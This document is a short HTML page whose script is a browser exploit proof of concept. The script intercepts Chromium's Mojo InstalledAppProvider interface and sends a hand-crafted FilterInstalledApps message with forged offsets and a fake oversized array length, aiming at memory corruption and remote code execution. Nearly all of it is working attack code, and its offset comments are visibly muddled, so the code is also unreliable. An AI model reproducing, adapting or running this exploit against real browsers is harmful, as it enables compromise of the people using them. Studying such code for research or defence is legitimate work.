    <h1>InstalledAppProvider OOB – Browser RCE</h1>
    <pre id="log" style="background:#111;color:#0f0;padding:10px;"></pre>
    <script>
    (async () => {
        const log = (msg) => {
            document.getElementById('log').textContent += msg + '\n';
            console.log(msg);
        };

        try {
            // Intercept the InstalledAppProvider pipe when it's created
            const interceptor = new MojoInterfaceInterceptor(
                'blink.mojom.InstalledAppProvider', 'process');
            interceptor.oninterfacerequest = (e) => {
                interceptor.stop();
                const remote = new blink.mojom.InstalledAppProviderPtr(e.handle);
                const pipe = remote.ptr.getHandle();

                // Build malicious FilterInstalledApps message
                const payload = new ArrayBuffer(256);
                const v = new DataView(payload);

                // Mojo message header (16 bytes)
                v.setUint32(0, 2, true);          // version
                v.setUint32(4, 0, true);          // flags
                v.setUint32(8, 0, true);          // ordinal = 0 (FilterInstalledApps)
                v.setUint32(12, 0, true);         // request_id

                // FilterInstalledApps params:
                // The vulnerable code reads from puVar1, which points to offset 16
                // puVar1[1] at offset 20 (count)
                v.setUint32(20, 2, true);          // count >= 2 → trigger offset path
                // puVar1[8] at offset 24: relative offset (64-bit)
                // We want to point to offset 0x40 inside the same buffer.
                // The offset is relative to puVar1+8, so target = puVar1 + 8 + offset
                // puVar1 = payload+16, so target = 16 + 8 + offset = 24 + offset
                // To reach 0x40: offset = 0x40 - 24 = 0x1C
                v.setBigInt64(24, BigInt(0x1C), true);

                // Fake data at offset 0x40:
                // The returned pointer = puVar1 + offset + 0x20 (since count>=2 and offset!=0)
                // = (16) + 0x1C + 0x20 = 0x52? Let's calculate precisely:
                // puVar1 = message+16. offset = 0x1C.
                // pointer = puVar1 + offset + 0x20 = message + 16 + 0x1C + 0x20 = message + 0x52
                // So we need fake data at 0x52. Let's put the array count there.
                const targetArrayPtr = 0x52;
                // At that location, we place a fake array length (e.g., 0x1000)
                v.setUint32(targetArrayPtr, 0x1000, true);  // large array → overflow

                // Send the raw message (no handles needed)
                pipe.writeMessage(payload, []);
                log('Malicious FilterInstalledApps sent!');
            };
            interceptor.start();

            // Trigger the renderer to request InstalledAppProvider
            if (navigator.getInstalledRelatedApps) {
                navigator.getInstalledRelatedApps().catch(() => {});
                log('getInstalledRelatedApps called');
            } else {
                log('getInstalledRelatedApps not available');
            }

            await new Promise(r => setTimeout(r, 2000));
            log('Done. If the browser doesn\'t crash, check the browser process.');
        } catch (e) {
            log('Error: ' + e.message);
        }
    })();
    </script>
